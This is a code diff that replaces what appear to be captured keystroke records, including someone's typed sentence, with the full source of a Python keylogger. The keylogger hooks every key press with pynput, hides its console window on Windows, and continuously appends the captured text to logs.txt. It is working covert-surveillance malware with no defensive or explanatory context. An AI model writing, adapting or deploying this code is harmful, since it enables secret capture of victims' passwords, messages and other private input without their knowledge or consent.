@@ -1,21 +1,41 @@
+import pynput.keyboard
+import threading
+import os
+import sys
 
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_l
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
+log = ""
 
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
+def hide():
+    # Hide the console window (works on Windows)
+    import ctypes
+    whnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if whnd != 0:
+        ctypes.windll.user32.ShowWindow(whnd, 0)
 
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
-Samir has been studying since 
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
-Samir has been studying since 2 years.
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
-Samir has been studying since 2 years.
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
-Samir has been studying since 2 years.
-Key.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lKey.alt_lnote
-Samir has been studying since 2 years.
+def on_press(key):
+    global log
+    try:
+        log += str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += " [" + str(key) + "] "
+
+def write_file():
+    global log
+    while True:
+        if len(log) > 0:
+            with open("logs.txt", "a") as f:
+                f.write(log)
+            log = ""
+
+def start():
+    hide()
+    listener = pynput.keyboard.Listener(on_press=on_press)
+    listener.start()
+    writer = threading.Thread(target=write_file)
+    writer.start()
+
+if __name__ == "__main__":
+    start()
